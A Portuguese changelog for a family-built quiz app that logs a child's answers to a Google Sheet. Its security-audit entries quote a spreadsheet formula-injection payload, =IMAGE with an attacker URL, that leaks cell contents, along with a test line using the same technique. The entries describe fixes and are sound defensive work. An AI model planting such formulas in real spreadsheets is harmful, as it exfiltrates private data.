A Alícia fechou a prova de Language Arts (21/21, 7 missões, uma sessão). O log
mostrou que da 3ª missão em diante a aula recebeu ~10 s — quatro telas em dez
segundos é tocar em "próximo", não ler. Refazer uma missão, do jeito que estava,
seria conferir memória em vez de praticar.

**Motor**
- `missao.sorteio.dificuldades` (ex.: `[1,2,2]`): o tamanho é quantas questões a
  sessão aplica, cada item é a dificuldade daquela posição. Sorteio novo a cada
  abertura da missão, sem repetir questão dentro da mesma tentativa.
- Missão sem `sorteio` aplica tudo na ordem escrita — a prova de matemática não
  precisou de uma linha de mudança.
- Alternativas embaralhadas a cada abertura, com o gabarito remapeado.
  `questao.alternativas_fixas: true` protege as questões cuja ordem tem sentido.
- `qsAtivas` é memória só: missão abandonada já recomeçava pela aula, então
  nunca há tela de desafio sem `openModule` ter passado antes.
- Bônus de confete assumia missão de 3 questões (`c===3`); agora usa o tamanho
  real do sorteio.

**Por que sortear e não gerar questão**
Banco escolhe entre questões escritas à mão, então `questao_id` continua estável
e retenção continua mensurável. Gerador produziria item novo a cada evento —
nunca se acumularia evidência sobre um item — e a dificuldade viraria rótulo de
template, que é uma média, não a dificuldade daquela instância.

**Build**
- Recusa a prova se o banco não tiver questões suficientes de cada nível pedido.
  Sem isso o motor cai no fallback e aplica questão fora do nível declarado em
  silêncio, que é o pior jeito de a dificuldade declarada deixar de ser verdade.
- O check de gabarito decorável passou a olhar só as questões `alternativas_fixas`:
  balancear à mão o que o motor embaralha não significa nada.

**Conteúdo**
- Language Arts: banco de 21 → 42 questões, 6 por missão, exatamente o dobro do
  sorteio em cada nível. Os ids Q1–Q3 ficaram intactos — já existem no log.

**Verificação**
- Suíte extraindo as funções reais do `motor.html` (não uma cópia): plano de
  dificuldade respeitado, sem repetição, banco inteiro coberto em 400 sorteios,
  gabarito preservado e passando pelas 4 posições, `alternativas_fixas` intocada,
  prova sem sorteio inalterada, banco capenga não encurta a missão.
- No navegador: 8 aberturas da mesma missão deram 6 conjuntos distintos; gabarito
  remapeado aceito na posição nova; 2ª tentativa, dica e medalha íntegras; a
  prova de matemática segue com figura e ordem original.

# Changelog

## 2026-08-24 — Repositório e circuito de ponta a ponta

Protótipo monolítico virou base reaproveitável. Nenhuma prova nova.

**Repositório**
- `git init`, commit inicial com motor, primeira prova e convenções.
- `docs/` versionado de propósito: é a saída publicada pelo GitHub Pages.

**Dados (etapa 0)** — `59c87f0`
- `regra` repopulada nas 7 missões. Vinham `null` desde a extração do monolito:
  o texto do cartão de regra só existia dentro do motor.
- `PASSOS` virou `questao.passos`, ancorado no `questao_id` em vez do índice.
- `{{GRAFICO_LIVROS}}` eliminado. `figura` virou objeto tipado:
  `{tipo:'barras',fonte:'missao'}` lê `missao.dados.serie`; `{tipo:'svg',...}`
  cobre desenhos avulsos.
- `build.mjs` recusa missão sem regra, passos malformados e figura desconhecida.

**Motor lê o JSON (etapa 1)** — `cc28cf6`
- Saiu o array `modules` com as 7 missões embutidas; entra `<script id="prova-data">`.
- `modules.reverse()` removido — a ordem é decidida na criação da prova.
- Vocabulário do motor passa a ser o do JSON.
- `KEY` e `FILA` incluem `prova_id`.
- Rótulos e contagens derivam de `missoes.length` e dos metadados.
- Guarda dupla para ferramenta inexistente: no build e no runtime.

**Telemetria por questão (etapa 2)** — `484ac0c`
- Uma linha por questão respondida, 28 campos da seção 5 do CLAUDE.md.
- Saem as linhas de resumo por missão e por jornada.
- Tempo até o primeiro toque e total; `tempo_valido=false` com saída de tela
  (Page Visibility) ou acima de 3 min. Nada disso aparece na tela.
- `sessao_id` sobrevive a fechar a aba; voltar marca `retomada=true`.
- `SHEET_URL` sai do código e passa a ser injetada por `build.mjs` do ambiente.
- `apps-script/enviar.gs` reescrito, com dedup por `evento_id`.
- Corrigido: a fila só era drenada em abertura do zero, nunca numa retomada.
- Corrigido: medalha e bônus assumiam 3 questões por missão.

**Verificado no navegador** (`node scripts/servir.mjs`)
Ordem das missões, aula fatiada, ferramenta interativa, cartão de regra com
texto, andaime uma etapa por vez, dois toques, 2ª tentativa, escudo, modo foco,
pausa na 2ª e 4ª missão, retomada após recarregar, e as 21 linhas de uma
jornada completa com as 28 colunas batendo com as do Apps Script.

**Não verificado por mim**: gravação real na planilha (depende da implantação
do Apps Script) e comportamento no aparelho da Alícia.

## 2026-08-24 — Correções e identidade do usuário

- **fix**: `isOpen()` lia `missoes[i-1].id`, campo extinto na etapa 1. Nenhuma missão
  destravava depois da primeira. `build.mjs` passa a recusar vocabulário extinto.
- **fix**: "Copiar resultados" duplicava tudo que foi respondido depois da última
  recarga — cada linha vive na fila E na lista da aba. Agora deduplica por `evento_id`.
  O envio à planilha nunca teve esse problema.
- **feat**: sair da missão pelo mapa, descartando o parcial. XP e telemetria ficam.
- **feat**: `prova.alunas` (lista) substitui `prova.aluna`. O motor pergunta uma vez
  por aparelho quem está estudando e grava na coluna `aluna`. Motivo: teste de adulto
  gravado no nome dela envenena a calibragem — responde rápido demais e acerta demais.
- Planilha criada no Drive: "Missão Estudos — log de questões", em
  01. Família & Pessoas › 04. Alícia › Educação. Nome neutro porque a recomendação é
  **uma base para as duas filhas**, separadas pela coluna `aluna`.

## 2026-08-24 — Publicação e dashboard dos pais

- Repo público em github.com/mattusca/missao-estudos; Pages servindo `docs/` com
  `noindex` + robots.txt. Histórico reescrito ANTES do push para remover o
  contexto clínico do CLAUDE.md → `CONTEXTO-PRIVADO.md` (gitignorado).
- **feat**: dashboard de acompanhamento (`apps-script/dashboard.html`), servido
  pelo Apps Script em segunda implantação; acesso = compartilhamento da planilha.
  Por tema: acerto sem apoio com estado "ainda não sei" (<10 eventos ou <3
  sessões), evolução por sessão, barras por dificuldade, contagem de apoios.
  Uma aluna por vez; `(teste)` filtrado no servidor e no cliente.
- `scripts/preview-dash.mjs`: preview com dados sintéticos (4 estados do card +
  linha de teste a filtrar), verificado no navegador. Saída no temp, nunca em docs/.
- **ci**: `.github/workflows/publicar.yml` — build de todas as provas com a
  `SHEET_URL` vinda de secret e publicação no Pages. Fonte do Pages migrada de
  "branch main /docs" para "GitHub Actions". Publicar passou a ser dar push.
- `docs/` saiu do versionamento (`.gitignore`): era a única via pela qual a URL
  do Apps Script voltaria a um repositório público. Um passo do Action aborta a
  publicação se uma URL real de implantação aparecer em arquivo versionado —
  o `{30,}` no padrão separa URL real dos placeholders da documentação.
- `lerEventos_` passa a mapear pelo cabeçalho da planilha, não pela posição fixa:
  uma coluna movida à mão faria o dash ler o campo errado em silêncio.

## 2026-08-24 — Correcao da barra de XP

- **fix**: `.hud .xpfill` era um `<span>` inline, e em elemento inline `width` e
  `height` nao se aplicam: a barra ficava 0x0. O numero de XP subia e a barra ao
  lado ficava vazia em qualquer nivel, desde o prototipo. `display:block` resolve.
  Verificado no navegador: 0%/50%/100% respondem (0 / 79 / 158 px num trilho de 160).

## 2026-08-24 — Prova de Language Arts Y5

Segunda prova do sistema, primeira fora de matemática. Base: roteiro da
professora, prova em 26/08.

**Motor** — 4 ferramentas de língua, genéricas e parametrizadas por `missao.dados`
como o `grafico`. A próxima prova de língua não deve precisar tocar no motor.
- `conector` — troca a palavra do meio e o sentido muda junto.
- `destacar` — toca frases do texto e vê a função de cada uma.
- `montar` — fichas embaralhadas para ordenar. Duas granularidades: palavras
  (gramática) e frases inteiras (sequência narrativa).
- `transformar` — toca a palavra e ela cicla entre as formas.
- Cartão de regra passa a renderizar `dados.texto` abaixo da regra. O texto de
  leitura vive num lugar só, pelo mesmo motivo da série do gráfico.

**Corrigido durante o teste**
- `montar` entregava as fichas na ordem correta: resolvia sozinho da esquerda
  para a direita e não ensinava nada. Agora embaralha, e regira se o sorteio
  cair na ordem certa.
- No celular o texto de leitura empurrava a 1ª alternativa para baixo da dobra
  (y=776 numa tela de 812) — ela teria de rolar até o fim para escolher e voltar
  ao topo para reler, que é a carga que o cartão fixo existe para tirar. Teto de
  altura com rolagem interna: 53% → 37% da tela. No tablet cabe tudo numa tela.

**Conteúdo** — 7 missões, 21 questões, gabarito 5/5/6/5, dificuldade média 1.81.
Enunciados em inglês, andaime em português: o apoio existe para tirar carga, e em
L2 viraria mais uma coisa a decodificar. `Writing: Narrative` não cabe em múltipla
escolha e virou *narrative craft* — sequência, abertura, show vs tell.

**Privacidade** — `escola` passa do nome da escola para o código `"PD"`. O nome
estava no JSON versionado e na página publicada, ao lado do primeiro nome e do ano.
Ressalva: o histórico do Git já o contém desde o primeiro push.

**Verificado no navegador** — as 4 ferramentas respondendo ao toque; gate do mapa
destravando só a missão seguinte (testado pelo mapa, não por `openModule`); dois
toques; 2ª tentativa sem revelar gabarito; escudo; andaime um passo por toque;
modo foco; retomada com XP, medalhas, foco e identidade; jornada completa com 21
linhas de 28 colunas, `bncc: null` e `escola: PD`.

**BNCC** — Língua Inglesa só existe na BNCC a partir do 6º ano. Os 7 temas `ING.*`
entram com `habilidade_bncc: null`, não com código inventado.

## 2026-08-24 — Identidade primeiro, progresso por pessoa

- **feat**: "Quem está estudando?" passa a ser a primeira tela de toda sessão, não
  só da estreia do aparelho. Com Marco e Fernanda testando no mesmo tablet da
  Alícia, perguntar uma vez gravaria linha no nome errado. O último nome escolhido
  vem marcado ("última vez"), então o caminho de sempre continua custando um toque.
- **fix**: progresso era por prova e por APARELHO — `missao_progresso_<prova>_v2`.
  Os três dividiam o mesmo XP, medalhas e mapa. Um teste de adulto entregaria à
  Alícia o jogo já ganho: 7 medalhas e o mapa inteiro aberto antes de ela começar.
  A chave passa a incluir a pessoa e virou função, porque só pode ser resolvida
  depois da escolha. Trocar de pessoa recarrega o estado dela, não só redesenha o mapa.
- **fix**: o HUD aparecia sobre a tela de escolha mostrando "Nível 1 · 0 XP" —
  placar de ninguém, que ainda mudava sozinho quando o progresso carregava.

**Verificado no navegador** — Marco joga a missão 1 (480 XP, 1 medalha); Alícia abre
e encontra 0 XP, nenhuma medalha e 6 de 7 travadas; voltando ao Marco, os 480 XP e a
missão 2 aberta reaparecem. Duas chaves separadas no localStorage. Nas duas provas.

## 2026-08-25 — Circuito fechado de ponta a ponta

Marco implantou o Apps Script (duas implantações) e a `SHEET_URL` entrou como
secret do repositório. O build passou a imprimir "envio para a planilha: ATIVO".

**Verificado de ponta a ponta, na página publicada**
- Ping da telemetria responde; o gate do `doGet` recusa servir o dashboard pela
  URL pública, como projetado.
- Dashboard anônimo → 302 para o login do Google. O acesso é o compartilhamento
  da planilha, não senha no código.
- Questão respondida no navegador vira linha na aba `Eventos`: cabeçalho
  autogerado com as 28 colunas e o evento completo (`Marco (teste)`,
  `ING.ESC.CONECT.Q1`, `acerto_1a`, `escola PD`, `BNCC` vazio).
- Tempo até o 1º toque medido corretamente: 4,2 s para uma pausa de 4,2 s.
  O `0` da primeira linha era clique automático instantâneo, não defeito.
- A URL está na página publicada e **não** no repositório — `git grep` limpo.

Ficam na planilha 2 linhas de `Marco (teste)` deste teste. São filtradas no
dashboard (servidor e cliente) e não entram na calibragem.

## 2026-08-25 — Auditoria de injection

Revisão dos pontos onde dado externo vira HTML ou célula de planilha.

- **fix (sério)**: injeção de fórmula no Sheets. O `doPost` é público de
  propósito e a URL está no HTML publicado — qualquer um que veja o fonte da
  página consegue gravar linhas. O Sheets trata string começada por `= + - @`
  como fórmula, então dava para plantar `=IMAGE("http://atacante/"&A2)`: o
  Sheets buscaria a imagem e o conteúdo da célula sairia dentro da URL do
  request. Numa planilha com nome e desempenho de crianças, isso é vazamento.
  `celula_` passa a prefixar apóstrofo nesses casos e a limitar strings a 300
  caracteres. Números e booleanos passam intactos.
- **fix**: `</script>` dentro do JSON da prova fecharia a tag cedo no
  `build.mjs`, transformando o resto em HTML executável. O JSON contém HTML de
  propósito (regra, aula), então é armadilha para nós mesmos no dia em que uma
  questão precisar falar da tag. `<` vira `\u003c`; o `JSON.parse` desfaz.
  O `<title>` também passou a ser escapado. O dashboard já fazia isso.

**Sem achado**: o dashboard escapa todo campo de texto vindo da planilha
(`aluna`, `materia`, `tema_id`, `subtema`); os demais são números calculados.
As ferramentas de língua usam `textContent`, não `innerHTML`. Bloquear linha
legítima via dedup é impraticável — `evento_id` carrega id aleatório.

**Risco aceito e conhecido**: qualquer um com a URL pode gravar linhas
plausíveis (poluir o log). Não há como autenticar sem pôr segredo no HTML
público, o que não resolveria nada. A coluna `aluna` e o filtro `(teste)`
limitam o estrago à calibragem, não ao acesso.

## 2026-08-25 — Segunda rodada da auditoria de segurança

- **fix**: com SHEET_URL malformada, o `build.mjs` imprimia o VALOR no erro — e
  esse build roda no Actions de repositório público, cujo log é público. O
  cenário exato do erro (espaço no fim, colagem dupla) é o em que o valor ainda
  é a URL real. A mensagem passa a omitir o valor e dizer só o tamanho.
- **fix**: os dois servidores locais escutavam em todas as interfaces
  (LAN inteira) e a checagem `startsWith(RAIZ)` aceitava diretório irmão de
  mesmo prefixo (`docs-x`). Agora: bind em 127.0.0.1 e prefixo fechado com
  `path.sep`. Provado com o predicado real: o irmão de prefixo era SERVIDO
  pela versão antiga e é 403 na nova; traversal (encodado, backslash) barrado
  nas duas; caminhos legítimos e raiz intactos.

**Sem achado nesta rodada**: atributos de aspas simples no dashboard (não há);
`timestamp` vira objeto Date, nunca string em célula; `innerHTML` das
ferramentas de matemática usa apenas valores internos; identidade renderizada
restrita à lista `alunas` do JSON de build; regex da SHEET_URL ancorado no host
exato (script.google.com.evil.com rejeitado — testado).

## 2026-08-25 — Proteção anti-fórmula verificada no endpoint

O primeiro redeploy não pegou: o `/exec` seguia na versão antiga mesmo com o
`Código.gs` salvo. Detectado por teste, não por leitura — uma linha com
`=IMAGE("http://example.com/vazou")` gravou `#REF!`, ou seja, o Sheets avaliou
a fórmula. O Google chegou a exibir o aviso "formulas are trying to send and
receive data from external parties"; aprovar o acesso teria ligado o vazamento.

Corrigido com "Gerenciar implantações → Versão: Nova versão" (Version 3), que
preserva a URL — o secret e as provas publicadas não precisaram mudar.

Verificado de novo, agora com canário **inerte** (`=1+1`, sem requisição
externa, aprendendo com a linha viva deixada no teste anterior): a célula
guardou o texto literal `=1+1` em vez de avaliar para `2`. Proteção ativa.

Nota operacional: `curl` devolve HTTP 411 nesses POSTs porque segue o redirect
do Apps Script e reemite sem `Content-Length`. O POST original é processado —
a verificação é ler a planilha, não o código de retorno.

## 2026-08-25 — Sessão com prazo de validade

- **Diagnóstico**: as respostas do Marco não chegavam à planilha. Causa: a aba
  rodava a versão da página anterior ao secret, então `TEM_URL` era falso e cada
  linha ia para a fila do `localStorage`. Nada se perdeu — o hard reload drenou
  a fila e as 7 linhas subiram sozinhas. O mecanismo offline fez o trabalho dele,
  só que em silêncio.
- **fix (métrica)**: `sessao_id` não expirava. Uma sessão real ficou com a 1ª
  questão às 20h27 de 24/08 e a 2ª às 13h03 de 25/08 — duas ocasiões de estudo
  contadas como uma. Isso corrói a regra de "3 sessões distintas" da seção 2:
  um tema ruim numa sessão pode ser cansaço, e só ocasiões separadas distinguem
  cansaço de lacuna. Agora a sessão expira após 3 h paradas; `posicao_na_sessao`
  recomeça em 1 e `retomada` volta a `false`, porque a linha abre uma sessão em
  vez de continuar a anterior.
  Verificado contra o cenário real: pausa de 45 min mantém a sessão (pos 3),
  a virada do dia gera id novo (pos 1). O dashboard passa a contar 2 sessões
  onde contava 1.
